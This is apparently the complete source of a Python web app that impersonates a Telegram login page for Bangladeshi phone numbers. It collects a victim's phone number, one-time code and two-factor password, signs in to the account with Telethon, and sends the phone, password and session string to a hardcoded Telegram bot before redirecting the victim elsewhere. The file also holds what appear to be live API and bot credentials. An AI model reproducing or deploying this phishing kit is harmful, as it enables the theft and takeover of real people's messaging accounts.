import os
import aiohttp
from quart import Quart, request, render_template_string, redirect
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

api_id = 18146130
api_hash = '21d85f812262209fe3f56a0c1c117f92'

bot_token = '7781700839:AAGbKfsipleOcXk06aWwnoikVxoGqVbePJk'
chat_id = '6782038686'

app = Quart(__name__)
clients = {}

# Template
BASE_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Telegram Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #e0f0ff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 0 15px rgba(0,0,0,0.1);
            width: 90%;
            max-width: 400px;
        }
        h2 {
            color: #0088cc;
            text-align: center;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 8px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            width: 100%;
            background-color: #0088cc;
            color: white;
            padding: 12px;
            margin-top: 15px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
        }
        input[type="submit"]:hover {
            background-color: #0075b0;
        }
        p {
            text-align: center;
        }
        small#error_msg {
            color: red;
            display: none;
            font-size: 0.85em;
        }
    </style>
</head>
<body>
    <div class="card">
        {{ content | safe }}
    </div>
</body>
</html>
'''

def render_page(content):
    return render_template_string(BASE_TEMPLATE, content=content)

@app.route('/', methods=['GET', 'POST'])
async def index():
    if request.method == 'POST':
        form = await request.form
        phone = form['phone']
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        try:
            await client.send_code_request(phone)
            clients[phone] = client
            return await render_page(f'''
                <h2>🔐 Enter OTP</h2>
                <form method="post" action="/otp">
                    <input type="hidden" name="phone" value="{phone}">
                    <input type="text" name="otp" placeholder="Enter the OTP code" required>
                    <input type="submit" value="Submit OTP">
                </form>
            ''')
        except Exception as e:
            return await render_page(f"<h2>❌ Error:</h2><p>{e}</p>")

    return await render_page('''
        <h2>📱 Telegram Login</h2>
        <form method="post" onsubmit="return fixPhoneInput()">
            <span>+880</span>
            <small id="error_msg">Invalid number</small>
            <input type="hidden" name="phone" id="full_phone">
            <input type="text" id="user_number" placeholder="1XXXXXXXXX বা 017XXXXXXXX" required oninput="validatePhone()">
            <input type="submit" id="submitBtn" value="Send Code" disabled>
        </form>
        <script>
            function validatePhone() {
                const inputField = document.getElementById("user_number");
                const errorMsg = document.getElementById("error_msg");
                const submitBtn = document.getElementById("submitBtn");

                let input = inputField.value.trim();

                if (input.startsWith("+880")) {
                    input = input.slice(4);
                } else if (input.startsWith("0")) {
                    input = input.slice(1);
                }

                if (/^[1][0-9]{9}$/.test(input)) {
                    errorMsg.style.display = "none";
                    submitBtn.disabled = false;
                } else {
                    errorMsg.style.display = "block";
                    submitBtn.disabled = true;
                }
            }

            function fixPhoneInput() {
                let input = document.getElementById("user_number").value.trim();
                if (input.startsWith("+880")) {
                    input = input.slice(4);
                } else if (input.startsWith("0")) {
                    input = input.slice(1);
                }
                document.getElementById("full_phone").value = "+880" + input;
                return true;
            }
        </script>
    ''')

@app.route('/otp', methods=['POST'])
async def otp():
    form = await request.form
    phone = form['phone']
    code = form['otp']
    password = form.get('password')
    client = clients.get(phone)

    if not client:
        return await render_page("❌ Login Error. Try Again")

    try:
        await client.sign_in(phone=phone, code=code)
    except SessionPasswordNeededError:
        if not password:
            return await render_page(f'''
                <h2>🔒 2FA Password</h2>
                <form method="post" action="/otp">
                    <input type="hidden" name="phone" value="{phone}">
                    <input type="text" name="otp" value="{code}" readonly>
                    <input type="password" name="password" placeholder="Enter your password" required>
                    <input type="submit" value="Verify">
                </form>
            ''')
        try:
            await client.sign_in(password=password)
        except Exception:
            return await render_page(f'''
                <h2>🔒 2FA Password</h2>
                <p style="color:red;">Wrong password. Try again.</p>
                <form method="post" action="/otp">
                    <input type="hidden" name="phone" value="{phone}">
                    <input type="text" name="otp" value="{code}" readonly>
                    <input type="password" name="password" placeholder="Enter your password" required>
                    <input type="submit" value="Verify">
                </form>
            ''')
    except Exception:
        return await render_page(f'''
            <h2>🔐 Enter OTP</h2>
            <p style="color:red;">Wrong code. Try again.</p>
            <form method="post" action="/otp">
                <input type="hidden" name="phone" value="{phone}">
                <input type="text" name="otp" placeholder="Enter the OTP code" required>
                <input type="submit" value="Submit OTP">
            </form>
        ''')

    # ✅ Success: Send session only once
    session_string = client.session.save()
    await client.disconnect()
    del clients[phone]

    message = f"📱 Phone: {phone}\n"
    if password:
        message += f"🔑 Password: {password}\n"
    message += f"📝 Session:\n`{session_string}`"

    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            payload = {
                'chat_id': chat_id,
                'text': message,
                'parse_mode': 'Markdown'
            }
            async with session.post(url, data=payload):
                pass
    except Exception as e:
        return await render_page(f"<h2>✅ Login Success, but error sending to Telegram:</h2><p>{e}</p>")

    # ✅ REDIRECT instead of showing success page
    return redirect("https://example.com")  # 🔁 Change this to your desired redirect URL

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
